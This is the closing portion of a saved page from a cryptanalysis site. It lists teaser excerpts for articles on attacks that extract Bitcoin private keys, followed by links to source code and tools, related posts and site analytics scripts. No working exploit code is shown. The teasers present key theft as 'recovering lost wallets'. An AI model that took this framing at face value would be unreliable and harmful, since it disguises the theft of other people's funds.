<li><em><a href="https://key3.ru/hexwitness-leak-a-critical-vulnerability-leaking-private-keys-through-the-witness-stack-is-a-deadly-threat-to-the-bitcoin-network-where-an-attacker-can-simply-trace-a-log-or-memory-dump-to-gain-comp/"><strong>HexWitness Leak: A critical vulnerability leaking private keys through the witness stack is a deadly threat to the Bitcoin network, where an attacker can simply trace a log or memory dump to gain complete control over someone else’s BTC.</strong></a>&nbsp;HexWitness Leak (Secret Key Leakage) Critical serialization and data output errors leading to accidental or intentional leakage of private keys pose a mortal threat to both individual users and the…<a href="https://key3.ru/hexwitness-leak-a-critical-vulnerability-leaking-private-keys-through-the-witness-stack-is-a-deadly-threat-to-the-bitcoin-network-where-an-attacker-can-simply-trace-a-log-or-memory-dump-to-gain-comp/">Read More</a></em></li>



<li><em><a href="https://key3.ru/hash-race-poison-attack-a-devastating-attack-on-digital-signature-infrastructure-including-private-key-recovery-for-lost-bitcoin-wallets-where-the-attacker-injects-their-own-values/"><strong>Hash Race Poison Attack: A devastating attack on digital signature infrastructure, including private key recovery for lost Bitcoin wallets, where the attacker injects their own values ​​into the signature, potentially leaking private keys.</strong></a>&nbsp;Hash Race Poison Attack A critical vulnerability arising from the lack of thread safety in the caching of cryptographic hashes in Bitcoin’s transaction signing infrastructure opens the door to one…<a href="https://key3.ru/hash-race-poison-attack-a-devastating-attack-on-digital-signature-infrastructure-including-private-key-recovery-for-lost-bitcoin-wallets-where-the-attacker-injects-their-own-values/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/bitcoin-golden-onehash-heist-recovering-lost-bitcoin-wallets-using-cve-2025-29774-where-an-attacker-signs-a-transaction-without-having-the-private-key-effectively-making-the-bitcoin-system/">Bitcoin Golden Onehash Heist: Recovering lost Bitcoin wallets using (CVE-2025-29774) where an attacker signs a transaction without having the private key—effectively making the Bitcoin system unable to distinguish between the true owner of Bitcoin funds and the attacker.</a>&nbsp;</strong>Bitcoin Golden Onehash Heist (&nbsp;Digital Signature Forgery Attack&nbsp;—&nbsp;&nbsp;CVE-2025-29774&nbsp;) The critical vulnerability in the SIGHASH_SINGLE flag handling discussed above opens the door to one of the most devastating attacks on the…<a href="https://key3.ru/bitcoin-golden-onehash-heist-recovering-lost-bitcoin-wallets-using-cve-2025-29774-where-an-attacker-signs-a-transaction-without-having-the-private-key-effectively-making-the-bitcoin-system/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/bloodprint-attack-is-a-devastating-vulnerability-that-leaks-private-keys-from-bitcoin-wallets-and-methods-for-recovering-them-the-vulnerability-gives-an-attacker-absolute-control-to-legitimately-sign/">Bloodprint Attack is a devastating vulnerability that leaks private keys from Bitcoin wallets and methods for recovering them. The vulnerability gives an attacker absolute control to legitimately sign any transactions and permanently withdraw all BTC funds.</a>&nbsp;</strong>Bloodprint Attack (Secret Key Leakage Attack) A critical cryptographic vulnerability involving private key leakage from memory leads to attacks known in scientific literature as «Secret Key Leakage Attacks» or «Key…<a href="https://key3.ru/bloodprint-attack-is-a-devastating-vulnerability-that-leaks-private-keys-from-bitcoin-wallets-and-methods-for-recovering-them-the-vulnerability-gives-an-attacker-absolute-control-to-legitimately-sign/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/streamleak-attack-total-compromise-of-bitcoin-assets-through-scientific-analysis-of-private-key-recovery-from-vulnerable-logging-systems-attackers-withdraw-funds-and-destroy-digital-property-without/">STREAMLEAK ATTACK: Total compromise of Bitcoin assets through scientific analysis of private key recovery from vulnerable logging systems. Attackers withdraw funds and destroy digital property without the owner’s knowledge.</a>&nbsp;</strong>STREAMLEAK&nbsp;ATTACK (&nbsp;Private Key Compromise Attack&nbsp;)&nbsp;&nbsp;is a method of extracting cryptographic secrets through abuse of an overloaded operator&nbsp;&nbsp;&lt;&lt;&nbsp;in C++. A critical vulnerability in the serialization and output of private keys could…<a href="https://key3.ru/streamleak-attack-total-compromise-of-bitcoin-assets-through-scientific-analysis-of-private-key-recovery-from-vulnerable-logging-systems-attackers-withdraw-funds-and-destroy-digital-property-without/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/oracle-whisper-attack-a-critical-base58-decoding-secret-leak-vulnerability-threatens-bitcoin-wallet-private-key-extraction-where-an-attacker-steals-secret-key-bits-from-the-i-o-library/">Oracle Whisper Attack: A critical Base58 decoding secret leak vulnerability threatens Bitcoin wallet private key extraction, where an attacker steals secret key bits from the I/O library.</a>&nbsp;</strong>Oracle Whisper Attack (&nbsp;Private Key Compromise Attack&nbsp;) Attack Description:When processing a Base58 string containing a private key, the attacker injects an «oracle»—a thin agent in the I/O library that whispers…<a href="https://key3.ru/oracle-whisper-attack-a-critical-base58-decoding-secret-leak-vulnerability-threatens-bitcoin-wallet-private-key-extraction-where-an-attacker-steals-secret-key-bits-from-the-i-o-library/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/hex-dump-reveal-attack-and-private-key-recovery-for-lost-bitcoin-wallets-where-an-attacker-uses-logging-of-secret-data-to-reveal-a-hexadecimal-dump-hex-dump-reveal-containing-btc-coins/">Hex Dump Reveal Attack and private key recovery for lost Bitcoin wallets, where an attacker uses logging of secret data to reveal a hexadecimal dump (Hex Dump Reveal) containing BTC coins</a>&nbsp;</strong>Hex Dump Reveal Attack (&nbsp;«Key Disclosure Attack», «Secret Key Leakage Attack», «Key Recovery Attack». CVE-2025-29774 and CWE-532&nbsp;) «Hex Dump Reveal»&nbsp;&nbsp;— «Hexadecimal dump disclosure». Vulnerabilities in the logging of private data,…<a href="https://key3.ru/hex-dump-reveal-attack-and-private-key-recovery-for-lost-bitcoin-wallets-where-an-attacker-uses-logging-of-secret-data-to-reveal-a-hexadecimal-dump-hex-dump-reveal-containing-btc-coins/">Read More</a></em></li>



<li><em><a href="https://key3.ru/secret-capsule-attack-recovering-bitcoin-wallet-private-keys-through-a-vulnerability-and-mass-compromise-of-bitcoin-wallets-where-an-attacker-creates-predictable-entropy-in-mersenne-twister-generato/"><strong>Secret Capsule Attack: Recovering Bitcoin wallet private keys through a vulnerability and mass compromise of Bitcoin wallets, where an attacker creates predictable entropy in Mersenne Twister generators, there are real thefts of user funds in the amount of over $900,000</strong></a>&nbsp;SECRET CAPSULE ATTACK (Predictable PRNG Seed Attack) The critical «Milk Sad» vulnerability (CVE-2023-39910), discovered in Libbitcoin Explorer’s entropy generation mechanism, clearly demonstrated how a single flaw in the randomness source…<a href="https://key3.ru/secret-capsule-attack-recovering-bitcoin-wallet-private-keys-through-a-vulnerability-and-mass-compromise-of-bitcoin-wallets-where-an-attacker-creates-predictable-entropy-in-mersenne-twister-generato/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/key-fountain-attack-turning-a-buffer-overflow-into-a-tool-for-btc-theft-and-private-key-recovery-in-the-bitcoin-ecosystem-where-an-attacker-gains-the-ability-to-extract-or-replace-bitcoin-wallet-sec/">Key Fountain Attack: Turning a Buffer Overflow into a Tool for BTC Theft and Private Key Recovery in the Bitcoin Ecosystem, where an Attacker Gains the Ability to Extract or Replace Bitcoin Wallet Secrets</a>&nbsp;</strong>Key Fountain Attack (&nbsp;Heap-based Buffer Overflow&nbsp;) The attacker prepares input data—specially formed fragments for the libbitcoin library’s splice or build_chunk functions—that exceed the allocated buffer size. For example, the transmitted…<a href="https://key3.ru/key-fountain-attack-turning-a-buffer-overflow-into-a-tool-for-btc-theft-and-private-key-recovery-in-the-bitcoin-ecosystem-where-an-attacker-gains-the-ability-to-extract-or-replace-bitcoin-wallet-sec/">Read More</a></em></li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="605" height="596" src="./Chronoforge_Attack__files/image-3.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys" class="wp-image-3786" style="aspect-ratio:1.015133392272089;width:574px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-3.png 605w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-3-300x296.png 300w" sizes="auto, (max-width: 605px) 100vw, 605px"></a></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This material was created for the&nbsp;&nbsp;<a href="https://cryptodeeptech.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>&nbsp;portal &nbsp;to ensure financial data security and elliptic curve cryptography&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">(secp256k1) against weak&nbsp;</a><a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;&nbsp;signatures&nbsp;&nbsp;&nbsp;in the&nbsp;&nbsp;<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">BITCOIN</a>&nbsp;cryptocurrency . The software developers are not responsible for the use of this material.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://cryptou.ru/vulncipher/" target="_blank" rel="noreferrer noopener">Crypto Tools</a></strong></p>



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/49ChronoforgeAttack" target="_blank" rel="noreferrer noopener">Source code</a></strong></p>



<p><strong><a href="https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery" target="_blank" rel="noreferrer noopener">Google Colab</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/owgbAd-vtoI" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/owgbAd-vtoI</a></strong></p>



<p><strong><a href="https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a" target="_blank" rel="noreferrer noopener">Video tutorial: https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/chronoforge-attack" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/chronoforge-attack</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Chronoforge_Attack__files/072-1-1024x576.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7639"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">
	</div><!-- .entry-content -->

	<footer class="entry-footer">
		<div class="cat-links"><i class="fa fa-folder-open" aria-hidden="true"></i> <a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a></div>	</footer><!-- .entry-footer -->
</article><!-- #post-3734 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://cryptodeeptech.ru/shadow-key-attack/" rel="prev">Shadow Key Attack: a fundamental threat of nonce leakage in Bitcoin transactions from the EUCLEAK mechanism via side channels of the Extended Euclidean Algorithm in YubiKey 5 devices and Infineon microcontrollers</a></div></div>
	</nav>		<div id="itng_related_posts_wrapper">
			<h3 id="itng_related_posts_title">Related Posts</h3>
			<div class="itng-related-posts row">
				<article id="post-1356" class="itng-blog col-md-6 col-lg-4 post-1356 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/crypto-risk-scoring/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/crypto-risk-scoring/">Useful tools and services for finding vulnerabilities in a transaction to assess the risk of blockchain and various cryptocurrencies</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					In this article, we have compiled a list of useful tools and services for tracking illegal activities, crypto threats, and finding vulnerabilities in blockchain transactions.&nbsp;Most of the services include a comprehensive hack monitoring platform and process algorithm for the security of crypto wallets.&nbsp;In cryptanalysis, the control and analysis of transactions is always important to us.&nbsp;These services are…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-1356 --><article id="post-2053" class="itng-blog col-md-6 col-lg-4 post-2053 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/polynonce-attack/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/polynonce-attack/">POLYNONCE ATTACK we use BITCOIN signatures as a Polynomial to an arbitrarily high power of 128 bits to get a Private Key</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					In this article, we will again touch on the topic:&nbsp;“Bitcoin’s Critical Vulnerability”&nbsp;and use the brand new attack of 2023&nbsp;“POLYNONCE ATTACK”&nbsp;on all three examples .&nbsp;The very first mention of this attack is described in an article from&nbsp;“Kudelski Security”&nbsp;. https://research.kudelskisecurity.com/2023/03/06/polynonce-a-tale-of-a-novel-ecdsa-attack-and-bitcoin-tears/ As a practical basis, we will take materials from our earlier article&nbsp;“&nbsp;Speed ​​up secp256k1 with endomorphism”&nbsp;where the values ​​​​on…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-2053 --><article id="post-1219" class="itng-blog col-md-6 col-lg-4 post-1219 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/defi-attacks/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/defi-attacks/">DeFi Attacks &amp; Exploits all the biggest cryptocurrency thefts from 2021 to 2022</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					In this article, we will tell you about the most daring and biggest thefts of cryptocurrencies associated with&nbsp;платформой DeFi.&nbsp;Hackers had a big year in 2021 when they stole $3.2 billion worth of cryptocurrencies.&nbsp;But in 2022, the amount of theft of cryptocurrencies reached a historical maximum.&nbsp;In the first three months of this year, hackers have stolen $1.3 billion&nbsp;from…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-1219 -->			</div>
		</div>
			<div id="author_box" class="row no-gutters">
			<div class="author_avatar col-2">
							</div>
			<div class="author_info col-10">
				<h4 class="author_name title-font">
					Crypto Deep Tech				</h4>
				<div class="author_bio">
									</div>
			</div>
		</div>
	
	</main><!-- #main -->

</div><!-- #content-wrapper -->


 <div id="footer-sidebar" class="widget-area">
    <div class="container">
        <div class="row">
                    </div>
    </div>
</div>
	<footer id="colophon" class="site-footer">
		<div class="container">
			<div class="site-info">
				Donation Address: <a href="https://www.blockchain.com/btc/address/1Lw2gTnMpxRUNBU85Hg4ruTwnpUPKdf3nV" target="_blank">♥  BTC: 1Lw2gTnMpxRUNBU85Hg4ruTwnpUPKdf3nV</a>				<span class="sep"> | </span>
					Copyright © 2026 «CRYPTO DEEP TECH». 			</div><!-- .site-info -->
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<nav id="menu" class="panel" role="navigation" style="position: fixed; top: 0px; bottom: 0px; height: 100%; left: -15.625em; width: 15.625em;">
	<div class="menu-overlay"></div>
	<div id="panel-top-bar">
		<button class="go-to-bottom"></button>
		<button id="close-menu" class="menu-link"><i class="fa fa-chevron-left" aria-hidden="true"></i></button>
	</div>

	<ul id="menu-main" class="menu"><li id="menu-item-229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li id="menu-item-3732" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a href="https://gcul.tech/cme-group-launches-tokenized-cash-product-based-on-gcul">GCUL PLATFORM</a><span class="dropdown-arrow" tabindex="0"><i class="fa fa-angle-down"></i></span>
<ul class="sub-menu" style="display: none;">
	<li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-post"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
</ul>
</li>
<li id="menu-item-541" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>
	<button class="go-to-top"></button>
</nav>

<div id="sticky-navigation">
	<div class="nav-wrapper">
		 <div class="container">

			 <div class="row justify-content-end align-items-center justify-content-between no-gutters">


				<div class="main-navigation col-lg-9" role="navigation">
					<ul id="menu-desktop" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-229"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-225"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-226"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3732"><a href="https://gcul.tech/cme-group-launches-tokenized-cash-product-based-on-gcul">GCUL PLATFORM</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-240"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-541"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-542"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>				</div>

				<button href="#menu" class="menu-link mobile-nav-btn"><i class="fa fa-bars" aria-hidden="true"></i></button>

				<button type="button" id="go-to-field" tabindex="-1"></button>

				<button class="search-btn-sticky ml-auto col-auto"><i class="fa fa-search"></i></button>
				
<div class="itng-search-sticky">
	<form role="search" method="get" class="search-form" action="https://cryptodeeptech.ru/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search …" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Search">
			</form>	<button type="button" id="go-to-btn" tabindex="-1"></button>
</div>

			</div>
		</div>
	</div>
</div>

<div id="itng-back-to-top" class="show"><i class="fa fa-chevron-up" aria-hidden="true"></i></div>

<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/it-news-grid/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
		<script type="text/javascript">
							jQuery("#post-3734 .entry-meta .date").css("display","none");
					jQuery("#post-3734 .entry-date").css("display","none");
					jQuery("#post-3734 .posted-on").css("display","none");
							jQuery("#post-1356 .entry-meta .date").css("display","none");
					jQuery("#post-1356 .entry-date").css("display","none");
					jQuery("#post-1356 .posted-on").css("display","none");
							jQuery("#post-2053 .entry-meta .date").css("display","none");
					jQuery("#post-2053 .entry-date").css("display","none");
					jQuery("#post-2053 .posted-on").css("display","none");
							jQuery("#post-1219 .entry-meta .date").css("display","none");
					jQuery("#post-1219 .entry-date").css("display","none");
					jQuery("#post-1219 .posted-on").css("display","none");
				</script>
	<script src="./Chronoforge_Attack__files/wmac_single_2b1ae4cca3cc8d12c39be42768565308.js" id="big-slide-js"></script>
<script src="./Chronoforge_Attack__files/wmac_single_ccdf893e7d8b26933af0c336bcc3943e.js" id="owl-js-js"></script>
<script src="./Chronoforge_Attack__files/jquery.magnific-popup.min.js" id="mag-lightbox-js-js"></script>
<script id="itng-custom-js-js-extra">
var itng = {"toTopEnable":"1","stickyNav":""};
//# sourceURL=itng-custom-js-js-extra
</script>
<script src="./Chronoforge_Attack__files/wmac_single_ea8874ba65dbd53bf5c7fb5c619ac579.js" id="itng-custom-js-js"></script>
<script src="./Chronoforge_Attack__files/wmac_single_6ec0e9b3201c83a442e24aba829a5f05.js" id="itng-navigation-js"></script>
<script id="wp-statistics-tracker-js-extra">
var WP_Statistics_Tracker_Object = {"requestUrl":"https://cryptodeeptech.ru/wp-json/wp-statistics/v2","ajaxUrl":"https://cryptodeeptech.ru/wp-admin/admin-ajax.php","hitParams":{"wp_statistics_hit":1,"source_type":"post","source_id":3734,"search_query":"","signature":"3822a2184fda7f570a54720a6a14337b","endpoint":"hit"},"option":{"dntEnabled":false,"bypassAdBlockers":false,"consentIntegration":{"name":null,"status":[]},"isPreview":false,"userOnline":false,"trackAnonymously":false,"isWpConsentApiActive":false,"consentLevel":"functional"},"isLegacyEventLoaded":"","customEventAjaxUrl":"https://cryptodeeptech.ru/wp-admin/admin-ajax.php?action=wp_statistics_custom_event&nonce=c42aa4a34e","onlineParams":{"wp_statistics_hit":1,"source_type":"post","source_id":3734,"search_query":"","signature":"3822a2184fda7f570a54720a6a14337b","action":"wp_statistics_online_check"},"jsCheckTime":"60000"};
//# sourceURL=wp-statistics-tracker-js-extra
</script>
<script src="./Chronoforge_Attack__files/wmac_single_e892010f402de73f9256172018787e5d.js" id="wp-statistics-tracker-js"></script>
<!-- Yandex.Metrika counter --> <script type="text/javascript"> (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(89424273, "init", {  id:89424273, clickmap:true, trackLinks:true, webvisor:true, accurateTrackBounce:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/89424273" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter -->
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   var z = null;m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(89995532, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/89995532" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->



</body></html>